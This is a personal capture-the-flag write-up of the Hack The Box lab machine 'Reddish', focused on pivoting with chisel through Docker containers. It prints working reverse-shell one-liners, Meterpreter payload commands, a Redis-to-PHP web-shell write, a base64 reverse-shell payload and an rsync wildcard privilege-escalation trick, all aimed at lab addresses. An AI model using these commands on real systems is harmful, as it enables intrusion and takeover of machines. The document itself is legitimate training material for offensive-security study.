# Reddish

Name: Reddish
Date:  24/08/2022 - 29/3/2023
Difficulty:  Insane
Goals:  
To practice:
- Different ways pivot, how to, the limitation, risks
- Linux related machines not done one recently 
- Database hacking
- Be handheld through an insane machine to know how far I many connections in my brain I have to go - roughly scaled between scarily alot and too much of a  ton
	- Reasoning comes from being good guitar. Sometime you just to sit there and be wowed and try anyway, clumsy try, find the parts that are difficult and find similarly easiler elements elsewhere, [More Rocky](https://www.youtube.com/watch?v=hHpFSQMUxj4), [More Cheesey](https://www.youtube.com/watch?v=yGZsnbPCv1I) or [More British](https://www.youtube.com/watch?v=pt-Yc2rzOOM) or more [Bass](https://www.youtube.com/watch?v=Sa0upTDZDYQ) or [Spanish](https://www.youtube.com/watch?v=NIKWBdthzg4) - combine all of that and keep building
Learnt:
1. I need to try switching more Web Requests
2. TCP reply not listen back on shell...
3. cat file transfer
4. Wonders/Horrors /dev/shm directory
5. Manual (Heard but not tried till now) Go Programs by using ldflags and upx packing from 10Mb to 3Mb!
6. Power of chisel only.
7. Excalidraw is time consuming compare to pen and paper but looks good, I guess I'll add a drawing pad to eventually one day shop list 
8. Favicons were a larger indication of where I am capable of expanding further intuitively as it boils down too:
	1. What is in front of you - what can I use to solve X - not what could be in front of you 
	2. What sticks out on a blank screen with Favicon and response error code.
9. The power of `nohup`  and `&` 
10. WILDCARDS in PrivEsc
11. Linpeas.sh pivot-delivery 
12. Requirement of CMD-by-CMD
13. Requirement of "Crouching in your report work, evaluating your capability"
14. Requirement of Helped-Throughs and Reruns of machines
15. Insane machine tend to probe all areas of understanding and are more about the endurance of being open to breaking patterns - i.e it is a long process wher eeach section is different meaning that your common patterns are exposed and moving to a mindset of "Step back and comprehend is vital"   
16. Xargs revision
17. Intro to rsync
18. Exclaridraw is a free solution to mapping out a network visually which is better than the alternative of working with abstract addressing tables
19. Chisel Chaining thourhg multiple machines
 
Beyond Root:
- Omni-Tool-Usage for port redirection - but demostrate with Ubuntu server for tools cannot just install onto the box 
- Clarity over all possible options 
- Revamp my Port-Redirection article(s), Chisel
- IDEAS

Returning to this box as I left it in a incomplete state while taking so much information away in 2022. As of 2023 I need a primer on a large potential part of OSCP, virtual and physical networking for AZ. Given this is the forth time returning to this box and the fifth time following along, I must note that I learnt so much and I am here to finish this as helped-through andmake sure port-redirection is engrained in my brain forever. I used and will use again [Ippsec Reddish Video](https://www.youtube.com/watch?v=Yp4oxoQIBAM), [0xDF write up](https://0xdf.gitlab.io/2019/01/26/htb-reddish.html), [0xDF Tunneling and Pivoting](https://0xdf.gitlab.io/2019/01/28/pwk-notes-tunneling-update1.html) and [0xDF using chisel with SSF](https://0xdf.gitlab.io/2020/08/10/tunneling-with-chisel-and-ssf-update.html)
As a general note to any unsuspecting readers, this a continuation of trying and so it contains me attempt to figure out were my recon is well tuned and not, but therefore there are also tangents including later additions of trying to figure out by comparison what I not doing correctly or efficiently. In hindsight and the most unhelpful statement to less experienced is that CTF are meant to be solved the pieces exist on the box to solve them, but also rabbit holes that will lead you astray, which is both something you have to learn to live and learn to overcome. There is a very steep learning curve with hacking and CTFs ramp upin a unrealistic way to taeach you a skill of avoiding the rabbit hole, but also the finding the alogorically thread and pull on it, but also collecting all the threads and the "purpose" of the machine. The latter being a SysAdmin it is easy to know that server X does Y function for a business, but when you are doing CTFs it was hard doing these alone without some these obvious to other concepts just apparent. 

## Recon

The time to live(TTL) indicates its OS. It is a decrementation from each hop back to original ping sender. Linux is < 64, Windows is < 128.
![ping](HackTheBox/Retired-Machines/Reddish/Screenshots/ping.png)

#### Note to self...

I want to note some of the differences to mine and Ippsec's more efficient Recon, although its is a scripted video it is still someone else approach to Web Hacking to assimilate to my own. Firstly Icons favicons, in the Haddix Bug Bounty Hunter Methodology and on serveral podcasts Haddix mentions a friend whom had a expertise in favicon abuse. 

Unknown Application?
- Download the Favicon and reverse image search

#### Return to WTF is this

A reason to use google more than other is search engines with great seach scope can help you identify the RedNode Application. I feroxbuster and then tried the /red/about directory and got this post request :
This is such a weird request to me. We get back HTTP/2 of all things.

![1080](weirdtokenrequest.png)

To get the About.html, grepping for `red`
![](greppingtheabout.png)`

Reveals node-red...

I still think the favicon is cooler, but I a happy that I am improving my searching or dorking ability somewhat as I have be worrying I am too meticulious or no where near enough to get anywhere. **BUT** I would have notice the key, but not found it.. I know 
![posting](ippsecposts.png)
Day 1 : `ab68fb463e681b499d99226ce92e12e9`
Day 2: returned it generate a new `b1a51218f30da47d4f45b52972804d1a`
Day 3: After along time away: `695613754dfef3f53a0b18b02d805047`
Day 4: After some practice elsewhere
Day 5-7: `c811816e50d58bd34204067b8ba3ae80`
Day 8-10: `13492c3c28a60b2a4a00971f3c9a6629`
Day 11: `7de1d67778f7702daab47daa9ff58d1d`
Day 12: ??
Day 13: to far gone

As of Day 5-8; I have learn so much as to why my approaches were good
1. Manual combing the with burp site and asking questions is really good
1. Given time limits I was and set myself to try to expand my experience of different possiblities of problem, rushing and missing the key seems so silly, but indicative of me stress testing to push my brain to make me care a  great deal about hacking and solving boxes 
	- Neurologically very important
1. I answer the question of what content is accessible with feroxbuster 
and not as well rounded:
1. I found that the best way to track myself and will for changing request types was curl
	1.  Although Ippsec is very good there are somethings that reveal to me through hacking that some there are much much better ways to keep notes and tools for the job for cyclic enumeration and exploitation 
		1. Watching some of the top HTB hackers you realise that they all do one thing that Ippsec video do not teach: really simple stuff first and they show it. XCT remind you that tooling is important, but if you brain knows just grep it that is something more time-savingly awesome and the really key to how people like xct get first bloods. They do really simple stuff to get answer that everyone else who is still learning the technology and tools miss both learning.

`curl -X` is so much more time friendly and note-keeping friendly, than burp, but you need to manually feel out the site. Keeping track each request obscured by the GUI. Maybe burp pro irons this into something really usable, but intutively that just seems excess layering and expensive. 
![](metametathereruncurlisgood.png)

[Node-RED](https://nodered.org/about/) is a program tools visually displaying and interactable function of a program in chart.

![](no-exploits.png)

This section was a real hammered  home of the, how can I achieve my objective with what is in front of me. I think I have been concern about learning about and I will endeavour to try more boxes like this or to make VMs with this level of interactability, I remember there is some proving ground boxes that are more like this. This box is possibly one of the best boxes I have ever spent time on. I have spent alot on this box just learning.

## Exploit

Application?
- What can you do with it to CRUD the filesystem, network, etc?
- Can you replicate it 

![nodered](NODE-red.png)

TCP reply to! This is misconfiguration vulnerablity as we are affectively RCE the box with pretty much unlimited functionality through the hosting of this service using the host server. From DoSing, using it a proxy or tunnel, http server, C2 or email (it has social media and email functionality) or run javascript to mine cryptocurrency on the server owners electricity bill would be eye watering.

![shell](shell.png)

## Docker Foothold

Spawning TTYs
```bash
echo 'os.system('/bin/bash')'
/bin/sh -i
/bin/bash -i
perl -e 'exec "/bin/sh"'
lua -e "os.execute('/bin/sh')"
ruby -e 'exec "/bin/sh"'
# From within vi
:!bash
:set shell=/bin/bash:shell
# From within nmap
!sh
```

First one and half is a half and then get two for the two is one reverse shell rule.
1. `bash -c 'bash -i >& /dev/tcp/$IP/$PORT 0>&1'`
2. Perl is on the box:
```bash
perl -e 'use Socket;$i="10.10.14.123";$p=8001;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");};'
```

[Reading 0xDF try various functionality of the NodeRed application](https://0xdf.gitlab.io/2019/01/26/htb-reddish.html#code-execution--shell-in-node-red), I decided that an additional beyond root would be to do the same and the highest goal being to try to create a proxy via the NodeRED. In the beyond root section I will outline a proxy and other stuff both 0xdf and atleast one idea if I do not complete a proxy.

As a Day <4 note to self: even though I like ncat and netcat, I am glad to finally be prompted to use it as a file transfer mechanism instead of other tools. Similar to trying out powercat it felt fun, but also gratting a tad as I always see it on Enumeration Script scans after I run it.. but I don't check its there before file transfering.

Checking whether I can run in memory on the box:
![](noexecshm.png)

After researching and making go compilation and doing some of [[Hololive-Writeup]]. With shell stability in mind after returning to this machine for the third time, although I will do it this way just for my own peace on mind after, I want recall proxychaining and using chisel to the port forward to scan the subset with nmap. If we had NC we could do port scanning like this: `nc -zv 172.18.0.1 1-65535`. One thing to consider is that the noexec flag has been set on /dev/shm 

![](noexeconshm.png)

[/dev/shm is a common directory for marshalling and operating from in Linux for attackers as it directory that is a tempory file storage that uses RAM for the backing store](https://superuser.com/questions/45342/when-should-i-use-dev-shm-and-when-should-i-use-tmp. It is flushed leaving no trace of execution or what was put in that directory. It is also faster as than disk storage. For hardening
```bash
# To check flags 
mount | grep shm 
# Mitigation
sudo mount -o remount,noexec /dev/shm
```

Ippsec's `cat` file transfer is OP. WOW on the cat file transfer, I have not seen this on any OSCP cheatsheets!
```bash
bash -c "cat < /dev/tcp/$IP/$PORT > /tmp/LinEnum.sh"
```

With the new and improved [Hacktools](https://github.com/LasCC/Hack-Tools) tried meterpreter https and the nice copy and paste workflow... 
```bash
# Initial shell from Node RED
nc -lvnp 8000
# call 
bash -c 'bash -i >& /dev/tcp/10.10.14.132/8002 0>&1' &
# Beware it does not auto update fields!
msfvenom -p linux/x64/meterpreter_reverse_https LHOST=10.10.14.92 LPORT=4444 -f elf -o met

msfconsole -qx "use exploit/multi/handler; set PAYLOAD linux/x64/meterpreter_reverse_https; set LHOST 10.10.14.92; set LPORT 4444; run"

nc -lvnp  9696 < met
# On Node RED:
bash -c "cat < /dev/tcp/10.10.14.132/9696 > /tmp/met"
# chmod and use nohup to persist after ctrl+c the shell to get it back again
chmod +x met
nohup ./met
[Ctrl + c]
# Restart secondardy shell from the initial
bash -c 'bash -i >& /dev/tcp/10.10.14.132/8002 0>&1' &
# Meterpreter
meterpreter > shell

```

Previous days LinEnum finds Docker
![docker](weareindocker.png)

```bash
ls -la /
cat /proc/1/cgroup
# What does the network interfaces mean for routing and connectivity?
ip a
# How is the container connecting with other IPv4 addresses?
cat /proc/net/arp

```

0xDF's network enumeration got me interested in /proc and /proc/net specifically
```bash
# ARP table is useful as even in the cloud Ipv4 is still prodominant
# ARP is used to resolve IPv4 addresses, therefore addresses here are addresses that communicated to box
cat /proc/net/arp
```

I only got the .18.0.1 - given that it is a very low address and we are not in the cloud where we assume the IaaS, PaaS, etc take many of the lower addresses and obvious not the final .255 address of the subnet - we can understand 0xDF assumption that it is a gateway address i.e an address to map out another set of address in a subnet or (V)network.
![](nodot19.png)

[/Proc.txt kernel documentation](https://www.kernel.org/doc/Documentation/filesystems/proc.txt)
[Linux Kernel Networking](https://www.kernel.org/doc/Documentation/networking/)
[/proc/net/tcp](https://www.kernel.org/doc/Documentation/networking/tcp.txt) - [tcp.cong.c](https://github.com/torvalds/linux/blob/master/net/ipv4/tcp_cong.c) congestion control algorhythms on a single queue, with flagging to indicate a frame state on the queue:
- search the queue
- locking to prevent accidental use
- state management: thresholds and identification management
- module management: cleanup, default or other configuration setting  for congestion control
- congestion handling between socket and kernel
- reinitialisation and initialation everything above but kernel and sockets

Or you could manually checked the root directory for dot files and observed the `.dockerenv`, the above check for Docker contain is in the `/proc/1/cgroup`.
![](alwayslslainroot.png)

Although it is not mentioned a good thing to then check with Docker would be IP address as it is may have its own routing configuration to the host box.
![docker](dockerips.png)
Ping sweeping appears in both RedTeamFieldManual and Netmux operator handbook.
```bash
for ip in $(seq 1 5); do
	ping -c 1 172.18.0.$ip > /dev/null && echo "Online: 172.18.0.$ip"
done
```

Oneliner versions
`for ip in $(seq 1 5); do ping -c 1 172.18.0.$ip > /dev/null && echo "Online: 172.18.0.$ip"; done`
`for ip in $(seq 1 5); do ping -c 1 172.19.0.$ip > /dev/null && echo "Online: 172.18.0.$ip"; done`

![](pingsweepresult.png)

Identifying other boxes on the network.
- arp cache for IPv4 resolution

Oxdf better one liners 
```bash
# The reason I copy and paste these is the output is better handled 
# it is done in the background
# Errors are visible
for i in $(seq 1 254); do (ping -c 1 172.18.0.$i | grep "bytes from" | cut -d':' -f1 | cut -d' ' -f4 &); done

for i in $(seq 1 254); do (ping -c 1 172.19.0.$i | grep "bytes from" | cut -d':' -f1 | cut -d' ' -f4 &); done                    
```

Fingerprinting without nmap, etc using brain and cli. 

Port scanning with bash and /dev/tcp  
```bash
for port in 22 25 80 443 8080 8443; do (echo Hello > /dev/tcp/172.19.0.3/$port && echo "open - $port") 2> /dev/null; done

for port in 22 25 80 443 8080 8443; do (echo Hello > /dev/tcp/172.18.0.1/$port && echo "open - $port") 2> /dev/null; done
```

The output for command above
![1000](port80on3.png)

Ippsec inspired reverse pivot excalidraw-ing
![1080](ippsecreversepivotpowerpoint.excalidraw)

Ippsec discuss reducing the size of go binaries
```bash
# Remember if you compile for another system
# On target machine:
ldd --version # linux and windows
CGO_ENABLED=0 go build -ldflags="-s -w" # For static without c runtime libraries
# To mimise binary size
# -s strip binary of debug info
# -w strip of dwarf infomation 
upx chisel
```

Improved cli
```bash
# Setup proxychains and chisel
# Added -host over 0.0.0.0 default which is expose to the internet
./chisel server -p 9000 -reverse -v
# 
# 0xDF notes that the .2-4 address randomise for www,nodered and redis
targetIP= # the IP we want to target only accessible from nodered.
targetPORT= # the port we what to view from the portscan

./chisel client 10.10.14.132:9000 R:127.0.0.1:9001:$targetIP:$targetPORT
proxychains nmap -sT -F 
```


You could also do the same with the telling the entire subnet that nmap is being used with [naabu](https://github.com/projectdiscovery/naabu)  `-proxy string`  with socks5 proxy `(ip[:port] / fqdn[:port])`. From hellscape of the [[Squid-Helped-through]] machine where I hit the hard wall finding the proxy, but experiementing with what can and cannot be tunnelled.

Burpsuite socks proxy
![](proxyburpproxyception.png)

Through burpsuite 
![](reddishwebpage.png)

Ippsec points out a security risk being that if listening on 0.0.0.0 then is directly accessible by anyone. One thing not pointed out by either Ippsec or 0xDF is that with nikto scan it find a info.php page containing alots of information as it is phpinfo(). Most importantly: `Linux www 4.4.0-130-generic #156-Ubuntu SMP Thu Jun 14 08:53:28 UTC 2018 x86_64`

```go
chisel client 10.10.10.10:8000 R:127.0.0.1:8001:172.19.0.3:80
// The server also create Fingerprints 
```

![](webpagefunction.png)
Some checks urls
![](forbiddencodedfolder.png)

hits 
![](hits.png)

Ippsec provides justification based on the details in the code that there is database. Therefore on the network interface IP could be docker containers, database and the `http://172.19.0.3/` being the webserver. 

```bash
for port in $(seq 1 65535); do (echo Hello > /dev/tcp/172.19.0.2/$port && echo "open - $port") 2> /dev/null; done
```

... and the output:
![1000](portscan-2.png)

Using nmap -sC and -sV to identify for the screenshot:
![](redisrce.png)
I am sure I have done this Redis RCE on THM, but I want to read to hammer the RESEARCH button in my brain. Also to count issue in problem solving and desktop space, the beginning on noted diagrams, less ascii art. Introducing [Excalidraw for Obsidian](https://github.com/zsviczian/obsidian-excalidraw-plugin). 

![](Reddish-InitialThinking.md)


![](bamsearchsploit.png)
Before reading the exploitation of Redis without metasploit. Tunnelling to get to that Redis database is 

![](excellent.png)

[Reading](https://packetstormsecurity.com/files/134200/Redis-Remote-Command-Execution.html) this database RCE involves write file to the file system by putting out file into Redis server memory and then transfering it.
```bash
$ redis-cli -h 192.168.1.11 flushall
$ cat foo.txt | redis-cli -h 192.168.1.11 -x set crackit
# Looks good. How to dump our memory content into the authorized_keys file? 
# That’s kinda trivial.
$ redis-cli -h 192.168.1.11192.168.1.11:6379> config set dir /Users/antirez/.ssh/OK192.168.1.11:6379> config get dir
1) "dir"
2) "/Users/antirez/.ssh"192.168.1.11:6379> config set dbfilename "authorized_keys" 
OK
192.168.1.11:6379> save
OK
```

There is also [https://github.com/Ridter/redis-rce/blob/master/redis-rce.py](https://github.com/Ridter/redis-rce/blob/master/redis-rce.py) creates a server to interact with the redis database.  

https://packetstormsecurity.com/files/134200/Redis-Remote-Command-Execution.html

https://0xdf.gitlab.io/2019/01/26/htb-reddish.html#pivoting

## Returning Day 8-9 to Redis and beyond

The initial first four days for attempts got all the pieces ready for me, but as a remediation against step over issues  that I have overcome over months of other boxes and research.  

Chiselling to box
![](day8chiseltoredis.png)
A breakdown of this to really hammer home everything I have learnt over the last 6 months:
```bash
# First client to connect to a server
chisel client $serverIP:$serverPort
# Server is configured for reverse with -reverse 
# Therefore the syntax is R: for reverse
# Serving the traffic TO localhost and port
R:$localhostIPv4:$locahostPort: # :...
# ...:
:172.19.0.2:6379 # The address and port to reverse port forward traffic so that it is visible from 
# $localhost:$localPort
```
We are reversing - ie using the NodeRED box to send traffic that only it can reach to a chisel-server that can serve the traffic to us. Port redirection locally would be if we were using a client from our machine. Dynamic port redirection would be that we can access any address and port behind the NodeRED from one server ie .4, .3 and .2 addresses.

nmap as proof
![](nmapredisthroughrevportfwdproof.png)

Following along with Ippsec till we have a shell he demonstrates [Redis RCE from packetstormsecurity](https://packetstormsecurity.com/files/134200/Redis-Remote-Command-Execution.html). 
Firstly the article is suggesting to check if we can access the instance
```bash
nc localhost 6379
# We provide:
echo "Hey no AUTH required!"
```
We get back:
![](redisechoheynoauthrequired.png)
Therefore we can access it and the article then explain that...*"no AUTH required. Redis is unprotected without a password set up"*

It then suggest to create an ssh key, but we do not have ssh on the box and prosumably the redis box does not either. This is similar to the real world cloud environments where sysadmin should have only just in time access to the machines that do not need ssh, rdp - ask yourself should a container really need ssh after configuration. The anwser is no, we can redeploy the updated version of the machine as it is infrastructure as code being a docker container. Ippsec discuss the enumeration of connection between database and the web application.

For hits to be reflected on the page we both the web app, the database and the `ajax.php?test=` top connect the two. Testing how those interact is important.

- How do the applications and services running connect?
	- If they connect i.e web-app has URI that queries database, using the URI what can be done to both services - commands, api calls, etc?

Following along with Ippsec or the article
```bash
$ redis-cli -h 192.168.1.11 flushall$ cat foo.txt | redis-cli -h 192.168.1.11 -x set crackit
# Looks good. How to dump our memory content into the authorized_keys file? That’skinda trivial.
$ redis-cli -h 192.168.1.11
192.168.1.11:6379> config set dir /Users/antirez/.ssh/
OK
192.168.1.11:6379> config get di
1) "dir"
2) "/Users/antirez/.ssh"
3) 192.168.1.11:6379> config set dbfilename "authorized_keys"
4) OK
5) 192.168.1.11:6379> save
6) OK
```

WE need to use [FLUSHALL](https://redis.io/commands/flushall/)
```bash
# Delete all the keys of all the existing databases, not just the currently selected one. This command never fails.
flushall [ASYNC | SYNC]
```

The rationale behind the last three lines are before the comment... woops.
1. We need a web shell, that written in php 
2. To do such that it can be accessed by the webpage from redis we tell redis to
3. have some content we call `subscribetoippsec` populating the string with a web shell 
4. then tell redis the filename to be served by the webpage call cmd.php
5. then where that file should stored
6. the flushall will flush all the keys and values that we are providing over netcat that may exist in memory 
```bash
nc localhost 6379 
flushall
set subscribetoippsec "<? system($_REQUEST['cmd']); ?>"
config set dbfilename cmd.php
config set dir /var/www/html
# Then do not be an idiot and save it...
save
```

We need another shell for Day 8 and something I realised was is that the inital shell with `[object Object]` can make more shells. This seems CTFy  `nohup` and `&` with both I discover from [hexadix](https://hexadix.com/use-nohup-execute-commands-background-keep-running-exit-shell-promt/) so I could also now do the same with meterpreter for the metasploit `portfwd` command with `meterpreter`
![](chiselisnowajob.png)

Then I need to reconfigure burpsuite for a SOCKs proxy, returning to redo the webshell that I never saved...
![](pittytheunsavedfool.png)
Making sure to name the file correctly....and subscribe to ippsec harder
![](subscribetoippsecharder.png)

File is there

![](flabberghaster.png)

Burpsuite was irrating me, also reddish I need to keep the connection open as it is in the cache of redis.
![](burpisirratingme.png)

Ippsec and 0xDF initally check the networking in prioritising pre reverse shell. Ping will not return back. This is were I am completely unknown territory as to pivoting through. [[Hololive-Writeup]] has some of this, but through C2s so multiple manual approaches is now an additional requirement for my beyond rooting of this box. 

Also to make matter worse/better (in that I do not have to cleanup afterward) the Server also cleans up so we have continuously create the web shell. Also burpsuites URL encoding is a kicker where I need both to work for some time.. Also learnt how to add the video into markdown. 

<iframe width="560" height="315" src="https://www.youtube.com/embed/Yp4oxoQIBAM" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" allowfullscreen></iframe>


Instead I am going to watch the xct and ippsec version of their writeups for the Anubis machine as it pivot through a container with chisel and proxychains and burp for one day forgetting all the steps and doing the box without any real idea of the box for: [[Anubis-Writeup]]

Returning for Day 9 of the slow march through Reddish I decided that once again burpsuite was being either misconfigured by myself as I have not done this since the settings search feature of burpsuite, which is awesome , but I then decided to use cyberchef as xct uses cyberchef for encoding and the wonders of curl. My chisel usage is spot on again it is my configuration of burp. 

![1080](curlbutnoburp.png)

Trials and Trials continue on I suppose. Reiterating again because this is not a true writeup.
![](ipaof1271904.png)

1. Reddish exploit:
```bash
nc localhost 6379 
echo "Hey no AUTH required!"
flushall
set subscribetoippsec "<? system($_REQUEST['cmd']); ?>"
config set dbfilename cmd.php
config set dir /var/www/html
save
# Then do not be an idiot and save it...
# 0xDF 

# 0xdfreddishRCE.sh
#!/bin/bash

# https://0xdf.gitlab.io/2019/01/26/htb-reddish.html#webshell
redis-cli -h 127.0.0.1 flushall
redis-cli -h 127.0.0.1 -x set subscribetoippsecand0xdf "<? system($_REQUEST['cmd']); ?>"
redis-cli -h 127.0.0.1 config set dbfilename "cmd.php"
redis-cli -h 127.0.0.1 config set dir /var/www/html/8924d0549008565c554f8128cd11fda4/
redis-cli -h 127.0.0.1 save
```
2. And try
```bash
curl -X POST http://localhost:10001/cmd.php -d "cmd=perl%20-e%20'use%20Socket;$i=%2210.10.14.123%22;$p=8005;socket(S,PF_INET,SOCK_STREAM,getprotobyname(%22tcp%22));if(connect(S,sockaddr_in($p,inet_aton($i))))%7Bopen(STDIN,%22%3E&S%22);open(STDOUT,%22%3E&S%22);open(STDERR,%22%3E&S%22);exec(%22/bin/bash%20-i%22);%7D;'" --output -
```

The real reason is piecing things together
![](f187a0ec71ce99642e4f0afbd441a68b.png)

## Day 10-11

But I ran into issues and researched how I was to accomplish this.

Ippsec uses Chisel - Local Pivot
```bash
# Full command for local pivot
nohup ./chisel client 10.10.14.94:10000 10003:127.0.0.1:10003 &
# Breakdown:
# Create another 
chisel client 
# pointing to our chisel server:
10.10.14.123
# on port
10000 
# Then open locally ON REDDISH:
10003:
# And for the server open:
127.0.0.1:10003
# Traffic from port 10003 on Reddish will tunnel back to
127.0.0.1:10003
```

This is so that we catch the reverse shell from the NodeRed and forward back to 127.0.0.1:10003.

My issue was that I could access it, but it could not access me. To connect up some Azure Vnet knowledge here for revision Peering require connections to be made twice, once in each direction between two vnets.

Fixed the RCE -
- Where are we uploading to? - /8924d0549008565c554f8128cd11fda4/
- How the CVE described how the need for newlines in the cmd.php webshell
```bash
# 0xDF 
# cmd.php:




 <? system($_REQUEST['cmd']); ?>




# 0xdfreddishRCE.sh
#!/bin/bash

# https://0xdf.gitlab.io/2019/01/26/htb-reddish.html#webshell
redis-cli -h 127.0.0.1 flushall
cat cmd.php | redis-cli -x set subscribetoippsecandread0xdf
redis-cli -h 127.0.0.1 config set dir /var/www/html/8924d0549008565c554f8128cd11fda4/
redis-cli -h 127.0.0.1 config set dbfilename "cmd.php"
redis-cli -h 127.0.0.1 save
```
Although not something I tried I did check how else it could have been done; [alamot](https://alamot.github.io/reddish_writeup/#getting-www-data-www) prefers *to talk raw Redis. Have a look here [https://www.compose.com/articles/how-to-talk-raw-redis/](https://www.compose.com/articles/how-to-talk-raw-redis/) and here [https://redis.io/topics/protocol](https://redis.io/topics/protocol). So, basically, we can do something like this:*
```bash
echo -ne '*1\r\n$8\r\nFLUSHALL\r\n*3\r\n$3\r\nSET\r\n$1\r\n1\r\n$32\r\n<?php shell_exec($_GET["e"]); ?>\r\n*4\r\n$6\r\nCONFIG\r\n$3\r\nSET\r\n$10\r\ndbfilename\r\n$5\r\nz.php\r\n*4\r\n$6\r\nCONFIG\r\n$3\r\nSET\r\n$3\r\ndir\r\n$46\r\n/var/www/html/8924d0549008565c554f8128cd11fda4\r\n*1\r\n$4\r\nSAVE\r\n' | /tmp/socat - TCP:redis:6379
```

After fixing and figuring and learning so much about myself, chisel and method. BAM:
![](comeonletsgo.png)

Firstly I wanted to figure out the level of url encoding through curl before trying to ping back
![](whichperlandurlencoding.png)

```bash
perl -e 'use Socket;$i="172.19.0.3";$p=10003;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");};'

# We need to url encode the quotes!
curl http://127.0.0.1:10002/8924d0549008565c554f8128cd11fda4/nvm.php -d 'cmd=perl+-e+%27use+Socket%3b$i%3d%22172.19.0.3%22%3b$p%3d10003%3bsocket(S,PF_INET,SOCK_STREAM,getprotobyname(%22tcp%22))%3bif(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,%22>%26S%22)%3bopen(STDOUT,%22>%26S%22)%3bopen(STDERR,%22>%26S%22)%3bexec(%22/bin/bash+-i%22)%3b}%3b%27' --output -

```

## Finally a Foothold

![](yes.png)

Once the thrill of getting this far had died down I thren wonder how am I capable of file transfering and get more and better shells - MORE chisels

```bash
# NodeRED - more chisels
# 3 is the webshell
# 4 is to server file transfers through to 
nohup ./chisel client 10.10.14.94:10000 10004:127.0.0.1:10004 &

nohup ./chisel client 10.10.14.94:10000 10005:127.0.0.1:10005 &
```

![](wearestillinthedockerception.png)

But with users?
![](sadhomedir.png)

There is not much in term of files of these users or trace as neither are in /etc/passwd or /etc/groups

![](ipaweareinno4.png)

## www - backup - reddish

Backup directory is the only thing that stands out in the filesystem
![](backupstandsout.png)

`rsync` is used to backup and I recently was looking into commands I did not know on Linux that other individuals that use linux think are good - [The Linux Cast](https://www.youtube.com/@TheLinuxCast/channels) and [DistroTube](https://www.youtube.com/@DistroTube) for all the Linux things I do not need (till I do) and never knew I needed [This Linux Cast video explained a bit of rsync](https://www.youtube.com/watch?v=-Gl9H8TW774)

[0xdf](https://0xdf.gitlab.io/2019/01/26/htb-reddish.html#webshell) uses a DIY pspy
```bash
#!/bin/bash

IFS=$'\n'

old=$(ps -eo command)
while true; do
    new=$(ps -eo command)
    diff <(echo "$old") <(echo "$new") | grep [\<\>]
    sleep .3
    old=$new
done
```

He then exploit the wildcard of the `rsync -a *.rdb` with a reverse shell `p.rdb` that gets called via create a file `touch` called  `-e sh p.rdb` and using `base64 -d` to add content to `p.rdb`. The [rsync GTFObins](https://gtfobins.github.io/gtfobins/rsync/#shell) `-e sh` is to execute `sh` and because of wildcard - `*.rdb` it will execute because we have made a file that is then interpreted as a command by the rsync cronjob to run our reverse shell `p.rdb`.  

```bash
# Rsync Root shell
rlwrap ncat -lvnp 10004

# Add another Chisel - Local Pivot on NodeRed 
nohup ./chisel client 10.10.14.94:10000 10004:127.0.0.1:10004 &

vim # :set paste [ENTER] i [SHIFT CTRL + V]
perl -e 'use Socket;$i="172.19.0.3";$p=10004;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");};'

# Encode to base64 to copy
cat rsync-rs | base64 -w0
# On Backup Docker container

echo 
# Copy below type out the above
cGVybCAtZSAndXNlIFNvY2tldDskaT0iMTcyLjE5LjAuMyI7JHA9MTAwMDQ7c29ja2V0KFMsUEZfSU5FVCxTT0NLX1NUUkVBTSxnZXRwcm90b2J5bmFtZSgidGNwIikpO2lmKGNvbm5lY3QoUyxzb2NrYWRkcl9pbigkcCxpbmV0X2F0b24oJGkpKSkpe29wZW4oU1RESU4sIj4mUyIpO29wZW4oU1RET1VULCI+JlMiKTtvcGVuKFNUREVSUiwiPiZTIik7ZXhlYygiL2Jpbi9iYXNoIC1pIik7fTsnCg==
| base64 -d > /var/www/html/f187a0ec71ce99642e4f0afbd441a68b/p.rdb

# Abuse rsync gtfobins with
touch /var/www/html/f187a0ec71ce99642e4f0afbd441a68b/-e\ sh\ p.rdb
```

I decided to follow up to this point and bit further with Ippsec to get this done to move on to finishing my Beyond Roots today! From [Pre 40:00 to 58:00](https://www.youtube.com/watch?v=Yp4oxoQIBAM&t=2342s)
![](hurrayevenfurtherbeyond.png)

![1080](Reddish-ImprovedThinking)

File transfers for Post-Rsync
```bash

# Chisel Pivot for File Transfers initially and the a reverse shell - On NodeRed
nohup ./chisel client 10.10.14.94:10000 10005:127.0.0.1:10005 &

nc -lvnp 10005 < linpeas.sh

bash -c "cat < /dev/tcp/172.19.0.3/10005 > /tmp/linpeas.sh"
# Aaaaaaaaaaaaaawesome when this worked first
```

I really want to try get linpeas.sh to tunnel output to 10005, I tried just a text file.
![](hellofrommanypivotsin.png)

I woops the filename - very Network packet economy Level "Hello did someone order a exfiltration" bad-OPSEC, but very cool 
![](linpeasdelivery.png)

The question Ippsec says we should be asking about the script is that where is the password? We are still in the docker container, but as root.

## Day 13: Return to complete - www

As of Day 13 I know I can finish this today and would I like to do with the flair of one addition to the overall process, which encrypting the entire chisel setup and going very pro and not in the final sections use just one shell. I want really take away a much as I can from using `chisel` and for the other tools try them with comparison to chisel. The major observence was the pure simplicity of xct tradecraft.
1. Create and host a self signed TLS certificate for my encrypted tunnels
2. Continue have nice copy-and-pasted-automated (be more experiemental and local test driven) work flow of reverse-shells and the cert - also just to try
3. Use the `--fingerprint` flag aswell.  Why does not not force usage!

Reddish has demonstrated the need to split Notes unlike xct or Ippsec into X-CMD-by-CMDs and Notes. This helps with visibility of information, but also removes soooo much busy work from doing machines. I am hoping that this machine is last machine where I am crouched in the Writeup and Notes and move to more a report-post completion type scheduling. My reasoning for the current approach was to slow down and focus on the how and why I was doing something whereas now I need to either switch out and state this approach from the beginning like a helped-through or be more focused on the objective of completing machine and problem solving the machine not troubleshooting the what I doing wrong or where I have not found weakness in my fundementals or method or thinking. 

